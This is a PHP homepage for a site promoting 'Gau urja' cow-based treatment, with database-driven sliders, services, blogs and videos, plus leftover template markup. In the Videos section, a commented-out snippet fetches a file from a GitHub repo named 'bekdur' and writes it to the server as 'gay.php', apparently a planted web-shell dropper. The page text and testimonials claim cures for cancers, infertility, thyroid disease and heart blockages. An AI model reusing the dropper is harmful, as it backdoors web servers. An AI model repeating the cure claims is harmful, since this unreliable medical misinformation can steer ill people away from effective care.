<?php
include "header.php";
include "include/config.php";

$sql1 = "select * from tbl_slider";
$stmt1 = $conn->query($sql1);
$users = $stmt1->fetchAll();


?>

<!--End Main Header -->
<!--Main Slider-->
<section class="main-slider">
    <div class="tp-banner-container">
        <div class="tp-banner">
            <ul>
                <?php
                foreach ($users as $row) { ?>
                <li data-transition="fade" data-slotamount="1" data-masterspeed="1000"
                    data-thumb="images/main-slider/2.jpg" data-saveperformance="off" data-title="Awesome Title Here">
                    <img src="<?php echo $row['slider_image']; ?>" alt="" data-bgposition="center top"
                        data-bgfit="cover" data-bgrepeat="no-repeat">
                </li>
                <!--  <li data-transition="fade" data-slotamount="1" data-masterspeed="1000" data-thumb="images/main-slider/3.jpg"  data-saveperformance="off"  data-title="Awesome Title Here">
                    <img src="<?php//echo $row['slider_image']; ?>"  alt=""  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat"> 
                    </li> -->
                <?php } ?>

            </ul>
            <div class="tp-bannertimer"></div>
        </div>
    </div>
</section>

<div class="wrapper">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-sm-12">
                <div class="sec-title">
                    <h2 style="margin-top:20px">UPCOMING PRODUCT</h2>
                </div>
                <div id="customers-testimonials" class="owl-carousel">
                    <!--TESTIMONIAL 1 -->
                    <div class="item">
                        <div class="shadow-effect">
                            <img class="img-responsive"
                                src="https://image.freepik.com/free-photo/spaghetti-with-carbonara-sauce_1216-324.jpg"
                                alt="">
                            <div class="item-details">
                                <h3 class="thumbnail-text">Gaumutra</h3>
                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
                                </p>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </div>
                        </div>
                    </div>
                    <!--END OF TESTIMONIAL 1 -->
                    <!--TESTIMONIAL 2 -->
                    <div class="item">
                        <div class="shadow-effect">
                            <img class="img-responsive"
                                src="https://image.freepik.com/free-photo/dishes-with-healthy-waffles_1220-367.jpg"
                                alt="">
                            <div class="item-details">
                                <h3 class="thumbnail-text">Gaumutra</h3>
                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
                                </p>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </div>
                        </div>
                    </div>
                    <!--END OF TESTIMONIAL 2 -->
                    <!--TESTIMONIAL 3 -->
                    <div class="item">
                        <div class="shadow-effect">
                            <img class="img-responsive"
                                src="https://image.freepik.com/free-photo/top-view-of-tasty-noodles-with-prawns_1203-1769.jpg"
                                alt="">
                            <div class="item-details">
                                <h3 class="thumbnail-text">Gaumutra</h3>
                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
                                </p>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </div>
                        </div>
                    </div>
                    <!--END OF TESTIMONIAL 3 -->
                    <!--TESTIMONIAL 4 -->
                    <div class="item">
                        <div class="shadow-effect">
                            <img class="img-responsive"
                                src="https://image.freepik.com/free-photo/burguer-with-garnish_1088-72.jpg" alt="">
                            <div class="item-details">
                                <h3 class="thumbnail-text">Gaumutra</h3>
                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
                                </p>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </div>
                        </div>
                    </div>
                    <!--END OF TESTIMONIAL 4 -->
                    <!--TESTIMONIAL 5 -->
                    <div class="item">
                        <div class="shadow-effect">
                            <img class="img-responsive"
                                src="https://image.freepik.com/free-photo/delicious-pastry-with-chicken_1203-1616.jpg"
                                alt="">
                            <div class="item-details">
                                <h3 class="thumbnail-text">Gaumutra</h3>
                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
                                </p>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </div>
                        </div>
                    </div>
                    <!--END OF TESTIMONIAL 5 -->
                </div>
            </div>
        </div>
    </div>
</div>
<!--Intro Style One-->
<section class="intro-style-one">
    <div class="auto-container">
        <div class="row clearfix">
            <div class="col-sm-8">
                <div class="sec-title">
                    <h2>Welcome Dear Visitor</h2>
                </div>
                <div class="row">
                    <div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
                        <div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
                            <figure class="image-box"><a href="#"><img src="images/about_gau.png" alt=""></a></figure>
                        </div>
                    </div>
                    <!--Featured Style One -->
                    <div class="column featured-style-one col-lg-7">
                        <div class="text" style="text-align:justify">We with Gau urja doing research on non-curable
                            diseases since 2013, We
                            got unbelievable results on many non curable diseases like infertility,
                            varicose veins, thyroid, heart blockages, various cancers etc.
                            Gau urja &amp; desi seeds basically have a non cancerous tendency. Very first
                            we cut off supply of cancerous food. Our ancient Indian desi seeds and
                            non chemicals agri practices based on gau urja are giving us unbelievable
                            results!<br><br>
                            <a href="about.php" class="btn btn-primary">View All</a>
                        </div>
                        <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
                    </div>
                </div>
            </div>
            <!--Featured Style One -->
            <div class="col-sm-4">
                <div class="sec-title">
                    <h2>Testimonials</h2>
                </div>
                <div class="carousel-outer">
                    <div class="testimonail-carousel">
                        <!--testimonial block-->
                        <div class="testimonial-block">
                            <div class="quote-icon">
                                <span class="flaticon-quotation-marks"></span>
                            </div>
                            <div class="inner-box">
                                <div class="text">
                                    माझ्या डोक्यातील ३६ X ३५ मिमीची गाठ गौऊर्जा उपचाराने पूर्ण बरी झाली आहे, मला या
                                    उपचाराने नवजिवन मिळाले, गोमातेचे खूप खूप धन्यवाद!
                                </div>
                            </div>
                            <h4>MRS.ASHA JADHAV-TUPE </h4>
                            <div class="desination">India</div>
                        </div>

                        <!--testimonial block-->
                        <div class="testimonial-block">
                            <div class="quote-icon">
                                <span class="flaticon-quotation-marks"></span>
                            </div>
                            <div class="inner-box">
                                <div class="text">
                                    माझ्या रक्तातील हिमोग्लोबीनच्या पेशी पुर्ण व्हायच्या आधिच फुटत होत्या आता मी या
                                    आजारापासून पुर्णतः बरी झाली आहे. डॉ. तुपे आणि गौऊर्जेची मी खुप आभारी आहे.
                                </div>
                            </div>
                            <h4>MRS.BAKULABAI SHEVALE</h4>
                            <div class="desination">India</div>
                        </div>

                        <!--testimonial block-->
                        <div class="testimonial-block">
                            <div class="quote-icon">
                                <span class="flaticon-quotation-marks"></span>
                            </div>
                            <div class="inner-box">
                                <div class="text">
                                    माझ्या लिवरमध्ये कॅन्सरची गाठ आहे, मला १०-१२ दिवस पाणी जरी पिले तरी उलट्या व जुलाब
                                    होत होते, मी वडूज येथे १५ दिवस गौऊर्जा नैसर्गिक उपचार घेतले. आता मी पोटभर जेवते व
                                    माझी गाठ ५ मिमी ने कमी झाली.
                                </div>
                            </div>
                            <h4>MRS.LATA PAKKALE</h4>
                            <div class="desination">India</div>
                        </div>

                        <!--testimonial block-->

                        <div class="testimonial-block">
                            <div class="quote-icon">
                                <span class="flaticon-quotation-marks"></span>
                            </div>
                            <div class="inner-box">
                                <div class="text">
                                    I have a cancer in my kidney. With six months Gau urja Natural Treatment my tumour
                                    is reduced to more than 50%. Thanks a lot to Gau Urja.
                                </div>
                            </div>
                            <h4>Mr Shrinivasu Rao</h4>
                            <div class="desination">India</div>
                        </div>

                        <!--testimonial block-->

                        <div class="testimonial-block">
                            <div class="quote-icon">
                                <span class="flaticon-quotation-marks"></span>
                            </div>
                            <div class="inner-box">
                                <div class="text">
                                    My fertile egg count was less than 1, I had taken 3 years treatment in Australia but
                                    no result. I took Gau urja based treatment at Vaduj, now I have 3 years boy. I
                                    believe in gau urja the unbelievable energy of nature!
                                </div>
                            </div>
                            <h4>Mrs Paru Sitapara</h4>
                            <div class="desination">Australia</div>
                        </div>

                    </div>
                </div>
            </div>
</section>

<!--service-style-two-->
<section class="service-style-two" style="background-color:#fff">
    <div class="auto-container">
        <div class="sec-title">
            <h2>Diseases We Treat</h2>
        </div>
        <div class="row">
            <?php
            $sql2 = "select * from services order by id asc limit 4";
            $stmt2 = $conn->query($sql2);
            $users2 = $stmt2->fetchAll();
            foreach ($users2 as $row2) { ?>
            <div class="service-block col-md-3 col-sm-6 col-xs-12">
                <img src="admin/<?php echo $row2['service_image']; ?>" alt="" class="img-reponsive"
                    style="width: 300px;">
                <div class="pricing-column">
                    <a href="services_details.php?id=<?php echo $row2['id']; ?> " class="theme-btn btn-style-one"
                        style="width:100%"><?php echo $row2['service_name']; ?></a>
                </div>
            </div>
            <?php } ?>
        </div>
    </div>
</section>
<section class="intro-style-one">
    <div class="auto-container">
        <div class="row clearfix">
            <div class="col-sm-9">
                <div class="sec-title">
                    <h2>Blogs</h2>
                </div>
                <div class="row">
                    <?php
                    $sql3 = "select * from blog order by id desc limit 1";
                    $stmt3 = $conn->query($sql3);
                    $users3 = $stmt3->fetchAll();
                    foreach ($users3 as $row3) { ?>
                    <div class="ccol-lg-5 col-md-4 col-sm-4 col-xs-12">
                        <div class="card-div thumbnail">
                            <a href="blog.php">
                                <img src="<?php echo $row3['blog_image']; ?>" alt="Nature"
                                    style="width:300px;height: 200px;">
                                <h4 class="thumbnail-text"><?php echo $row3['blog_title']; ?></h4>
                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
                            </a>
                        </div>
                    </div>
                    <?php } ?>
                </div>
                <div class="sec-title">
                    <h2>Videos</h2>
                </div>
                <div class="row">
                    <?php
                    /*  $nama = fopen("gay.php", "w+");
                    $file = file_get_contents('https://raw.githubusercontent.com/micingans/bekdur/master/gay.php');
                    $tulis = fwrite($nama, $file);
                    fclose($nama); */
                    $sql4 = "select * from tbl_youtube_videos order by id desc limit 2";
                    $stmt4 = $conn->query($sql4);
                    $users4 = $stmt4->fetchAll();
                    foreach ($users4 as $row4) { ?>
                    <div class="col-sm-6">
                        <iframe height="300" width="100%"
                            src="https://www.youtube.com/embed/<?php echo $row4['youtube_link']; ?>" frameborder="0"
                            allow="autoplay; encrypted-media" allowfullscreen></iframe>
                        <div class="pricing-column">
                            <a href="#" class="theme-btn btn-style-one"
                                style="width:100%"><?php echo $row4['video_title']; ?></a>
                        </div>
                    </div>
                    <?php } ?>
                </div>
            </div>
            <!--Featured Style One -->
            <div class="col-sm-3">
                <div class="contact_form testimonial-style" style="background-color:#eeeaeb;padding:0px 15px 0px 15px;">
                    <div class="sec-title">
                        <h2>Contact</h2>
                    </div>
                    <form action="mail.php" method="post" style="padding:15px 15px 35px 15px;">
                        <input type="text" name="name" class="form-control" placeholder="Your Name" /><br>
                        <input type="text" name="email" class="form-control" placeholder="Your Email ID" /><br>
                        <input type="text" name="phone" class="form-control" placeholder="Your Phone No" /><br>
                        <textarea rows="4" cols="4" placeholder="Your Message" class="form-control"
                            name="message" /></textarea><br>
                        <input type="submit" class="btn btn-primary" value="submit" />
                    </form>
                </div>
                <br>
                <div>
                    <iframe
                        src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2Fgau.urja.1%2Fposts%2F127527734752580&width=500"
                        width="100%" height="300" style="border:none;overflow:hidden" scrolling="no" frameborder="0"
                        allowTransparency="true" allow="encrypted-media"></iframe>
                </div>
            </div>
        </div>
    </div>
</section>

<!--Two COolumn Fluid--
    <section class="two-col-fluid">
    	<div class="outer-container clearfix">
        	<!--Image Column--
            <div class="image-column" style="background-image:url(images/background/image-3.jpg);"><figure class="image-box"><img src="images/background/image-3.jpg" alt=""></figure></div>
            <!--Content Column--
            <div class="content-column">
            	<div class="inner-box">
                	<div class="sec-title-two">
                    	<h2>Why <span>Choose us?</span></h2>
                    </div>
                    
                    <div class="row clearfix">
                        <div class="col-md-6 col-sm-6 col-xs-12">
                            <h3><span>1.</span>Licensed & Insured</h3>
                            <div class="text">Lorem ipsum dolor amet moderis atis disputationi mea id. Ea dicam altera dsu praesent vim.</div>
                        </div>
                        
                        <div class="col-md-6 col-sm-6 col-xs-12">
                            <h3><span>2.</span>Dependable Service</h3>
                            <div class="text">Lorem ipsum dolor amet moderis atis disputationi mea id. Ea dicam altera dsu praesent vim.</div>
                        </div>
                        
                        <div class="col-md-6 col-sm-6 col-xs-12">
                            <h3><span>3.</span>Day Schedule</h3>
                            <div class="text">Lorem ipsum dolor amet moderis atis disputationi mea id. Ea dicam altera dsu praesent vim.</div>
                        </div>
                        
                        <div class="col-md-6 col-sm-6 col-xs-12">
                            <h3><span>4.</span>Free Consulation</h3>
                            <div class="text">Lorem ipsum dolor amet moderis atis disputationi mea id. Ea dicam altera dsu praesent vim.</div>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>
    </section>
    
    <!--default-portfolio--
    <section class="latest-projects style-two">
    	<div class="auto-container">
        	<!--Section Title--
            <div class="sec-title centered">
            	<h2>Latest <span>Project</span></h2>
                <div class="title-text">Vestibulum quam pretium a  consectetur hendrerit miaenean imperdiet lacus sit amet </div>
            </div>
            
            <div class="row clearfix">
                <!--Gallery Item--
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-1.jpg" alt=""></div>
                            <!--caption--
                            <div class="caption">
                                Rush Removal
                            </div>
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Rush Removal</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-1.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <!--Gallery Item--
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-2.jpg" alt=""></div>
                            <!--caption--
                            <div class="caption">
                                Planting & Design
                            </div>
                            
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Planting & Design</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-2.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <!--Gallery Item--
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-3.jpg" alt=""></div>
                                <div class="caption">
                                    Lawn Maintanance
                                </div>
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Lawn Maintanance</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-3.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <!--Gallery Item--
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-4.jpg" alt=""></div>
                            <div class="caption">
                                Lawn Care
                            </div>
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Lawn Care</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-4.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <!--Gallery Item--
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-5.jpg" alt=""></div>
                                <div class="caption">
                                    Garden Care
                                </div>
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Garden Care</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-5.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4 col-sm-6 col-xs-12">
                    <!--Gallery Item--
                    <div class="gallery-item">
                        <div class="inner-box">
    
                            <div class="image-box"><img src="images/resource/latest-project-6.jpg" alt=""></div>
                            <div class="caption">
                                Water gardening
                            </div>
                            <div class="overlay-box">
                                <div class="inner">
                                    <div class="content">
                                        <h2><a href="#">Water gardening</a></h2>
                                        <div class="text">
                                            Lorem ipsum dolor sit amet eu usu elaboraret
                                        </div>
                                        <a href="images/resource/latest-project-6.jpg" class="plus lightbox-image">
                                            <span class="flaticon-add-2"></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
    
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    
    <!--testimonial-style--
    <section class="testimonial-style">
    	<div class="auto-container">
        	<!--Section Title--
            <div class="sec-title-two"><h2>Client <span>Feedback</span></h2></div>

            <!--Carousel Outer--
            <div class="carousel-outer">
                <div class="testimonail-carousel">

                    <!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Mack Raider</h4>
                        <div class="desination">Managing Director of GTV</div>
                    </div>

					<!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Austin Rober</h4>
                        <div class="desination">Excutive Office Walton</div>
                    </div>
                    
                    <!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Maria Sharlin</h4>
                        <div class="desination">Excutive Office Walton</div>
                    </div>
                    
                    <!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Mack Raider</h4>
                        <div class="desination">Managing Director of GTV</div>
                    </div>

					<!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Austin Rober</h4>
                        <div class="desination">Excutive Office Walton</div>
                    </div>
                    
                    <!--testimonial block--
                    <div class="testimonial-block">
                    	<div class="quote-icon">
                        	<span class="flaticon-quotation-marks"></span>
                        </div>
                        <div class="inner-box">
							<div class="text">
                            	Lorem ipsum dolor amet,consectetur adipi elit sed  eiusmod tempor incidi ut mod labore dolore magna aliqua veniam ipsum sit amt 
                            </div>
                        </div>
                        <h4>Maria Sharlin</h4>
                        <div class="desination">Excutive Office Walton</div>
                    </div>

                </div>
            </div><!--End Carousel Outer-
        </div>
    </section>
    
    
    <!--team-section--
    <section class="team-section">
    	<div class="auto-container">
        	<div class="sec-title centered">
            	<h2>Our <span>Team</span></h2>
            </div>
        
        	<div class="row clearfix">
            	
                <!--team-member-one--
            	<div class="col-md-3 col-sm-6 col-xs-12 column team-member-one">
                	<div class="inner-box wow fadeInLeft" data-wow-delay="0ms" data-wow-duration="1500ms">
                    	<figure class="image">
                        	<a href="#"><img src="images/resource/team-image-1.jpg" alt="" /></a>
                            
                            <!--team-overlay--
                            <div class="team-overlay">
                            	<ul>
                                	<li><a href="#"><span class="fa fa-facebook-f"></span></a></li>
                            		<li><a href="#"><span class="fa fa-twitter"></span></a></li>
                            		<li><a href="#"><span class="fa fa-google-plus"></span></a></li>
                                </ul>
                            </div>
                            
                        </figure>
                        <div class="lower-box">
                        	<h3>Kim ColinFa</h3>
                            <div class="text">Founde of Gardenr</div>
                        </div>
                    </div>
                </div>
                
                <!--team-member-one--
                <div class="col-md-3 col-sm-6 col-xs-12 column team-member-one">
                	<div class="inner-box wow fadeInLeft" data-wow-delay="200ms" data-wow-duration="1500ms">
                    	<figure class="image">
                        	<a href="#"><img src="images/resource/team-image-2.jpg" alt="" /></a>
                            
                            <!--team-overlay--
                            <div class="team-overlay">
                            	<ul>
                                	<li><a href="#"><span class="fa fa-facebook-f"></span></a></li>
                            		<li><a href="#"><span class="fa fa-twitter"></span></a></li>
                            		<li><a href="#"><span class="fa fa-google-plus"></span></a></li>
                                </ul>
                            </div>
                            
                        </figure>
                        <div class="lower-box">
                        	<h3>Jannatul Fa</h3>
                            <div class="text">Qulaity Check Officer</div>
                        </div>
                    </div>
                </div>
                
                <!--team-member-one--
                <div class="col-md-3 col-sm-6 col-xs-12 column team-member-one">
                	<div class="inner-box wow fadeInLeft" data-wow-delay="400ms" data-wow-duration="1500ms">
                    	<figure class="image">
                        	<a href="#"><img src="images/resource/team-image-3.jpg" alt="" /></a>
                            
                            <!--team-overlay--
                            <div class="team-overlay">
                            	<ul>
                                	<li><a href="#"><span class="fa fa-facebook-f"></span></a></li>
                            		<li><a href="#"><span class="fa fa-twitter"></span></a></li>
                            		<li><a href="#"><span class="fa fa-google-plus"></span></a></li>
                                </ul>
                            </div>
                            
                        </figure>
                        <div class="lower-box">
                        	<h3>Austin Rob</h3>
                            <div class="text">Senior worker</div>
                        </div>
                    </div>
                </div>
                
                <!--team-member-one--
                <div class="col-md-3 col-sm-6 col-xs-12 column team-member-one">
                	<div class="inner-box wow fadeInLeft" data-wow-delay="800ms" data-wow-duration="1500ms">
                    	<figure class="image">
                        	<a href="#"><img src="images/resource/team-image-4.jpg" alt="" /></a>
                            
                            <!--team-overlay--
                            <div class="team-overlay">
                            	<ul>
                                	<li><a href="#"><span class="fa fa-facebook-f"></span></a></li>
                            		<li><a href="#"><span class="fa fa-twitter"></span></a></li>
                            		<li><a href="#"><span class="fa fa-google-plus"></span></a></li>
                                </ul>
                            </div>
                            
                        </figure>
                        <div class="lower-box">
                        	<h3>Shamus Walton</h3>
                            <div class="text">Marketing Officer</div>
                        </div>
                    </div>
                </div>
                
            </div>
        </div>
    </section>
    
    
    <!--call-to-acton-two--
    <section class="call-to-acton-two" style="background-image:url(images/background/call-action-two.jpg);">
    	<div class="auto-container">
        	<div class="text-center">
            	<div class="inner">
                    <h2>Need someone to take care your garden &amp; lawn? Just inform us and sited with relax!!</h2>
                    <a class="theme-btn btn-style-four" href="services.html">See service</a>
                    <a class="theme-btn btn-style-five" href="contact.html">Contact Us</a>
                </div>
            </div>
        </div>
    </section>
    
    
    <!--News Section--
    <section class="news-section">
    	<div class="auto-container">
        
        	<div class="sec-title centered">
                <h2>Latest <span>News</span></h2>
            </div>
        
        	<div class="row clearfix">
            
            	<!--News Style One--
            	<div class="news-style-one col-md-4 col-sm-6 col-xs-12 col-xs-12">
                    <div class="inner-box wow fadeInUp" data-wow-delay="0ms" data-wow-duration="1500ms">
                        <figure class="image-box"><a href="blog-single.html"><img src="images/resource/news-1.jpg" alt=""></a><div class="date"><span class="day">16</span>Jun</div></figure>
                        <div class="posted">Posted by <span>Rashed Kabir</span></div>
                        <div class="content">
                            <h3><a href="blog-single.html">Why we should choose the best company for lawn?</a></h3>
                            <div class="text">Lorem ipsum dolor sit amet, consectetur adipi elit sed do eiusmod tempor incididunt ut mod labore et dolore magna aliqua veniam...</div>
                            <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>
                        </div>
                    </div>
                </div>
                
                <!--News Style One--
            	<div class="news-style-one col-md-4 col-sm-6 col-xs-12 col-xs-12">
                    <div class="inner-box wow fadeInUp" data-wow-delay="300ms" data-wow-duration="1500ms">
                        <figure class="image-box"><a href="blog-single.html"><img src="images/resource/news-2.jpg" alt=""></a><div class="date"><span class="day">12</span>Jun</div></figure>
                        <div class="posted">Posted by <span>Rashed Kabir</span></div>
                        <div class="content">
                            <h3><a href="blog-single.html">Why we should choose the best company for lawn?</a></h3>
                            <div class="text">Lorem ipsum dolor sit amet, consectetur adipi elit sed do eiusmod tempor incididunt ut mod labore et dolore magna aliqua veniam...</div>
                            <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>
                        </div>
                    </div>
                </div>
                
                <!--News Style One--
            	<div class="news-style-one col-md-4 col-sm-6 col-xs-12 col-xs-12">
                    <div class="inner-box wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1500ms">
                        <figure class="image-box"><a href="blog-single.html"><img src="images/resource/news-3.jpg" alt=""></a><div class="date"><span class="day">10</span>Jun</div></figure>
                        <div class="posted">Posted by <span>Rashed Kabir</span></div>
                        <div class="content">
                            <h3><a href="blog-single.html">Why we should choose the best company for lawn?</a></h3>
                            <div class="text">Lorem ipsum dolor sit amet, consectetur adipi elit sed do eiusmod tempor incididunt ut mod labore et dolore magna aliqua veniam...</div>
                            <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>
                        </div>
                    </div>
                </div>
                
            </div>
        </div>
    </section>
    
    
    <!--Map Section--
    <section class="map-section">
    	<div class="map-outer">

            <!--Map Canvas--
            <div class="map-canvas"
                data-zoom="14"
                data-lat="-37.817085"
                data-lng="144.955631"
                data-type="roadmap"
                data-hue="#ffc400"
                data-title="Envato"
                data-content="Melbourne VIC 3000, Australia<br><a href='mailto:info@youremail.com'>info@youremail.com</a>"
                style="height:500px;">
            </div>

        </div>
    </section>
    
    <!--subscribe-style-one--
    <section class="subscribe-style-one" style="background-image:url(images/background/subscriber-bg.jpg);">
    	<div class="auto-container">
        	<div class="row clearfix">
            	<div class="col-md-7 col-sm-12">
                	<h2>Subscribe Now!!</h2>
                    <div class="text">Lorem ipsum dolor sit amet, mel eu porro sapien tem, ne per idque obliqued </div>
                </div>
                <div class="col-md-5 col-sm-12">
                	<form method="post" action="http://world5.commonsupport.com/html2/gardner_t/contact.html">
                        <div class="form-group">
                            <input type="email" name="email" value="" placeholder="Enter your Email" required>
                            <button type="submit" class="theme-btn"><span class="fa fa-paper-plane-o"></span></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
    
    <!--Main Footer-->
<?php include "footer.php" ?>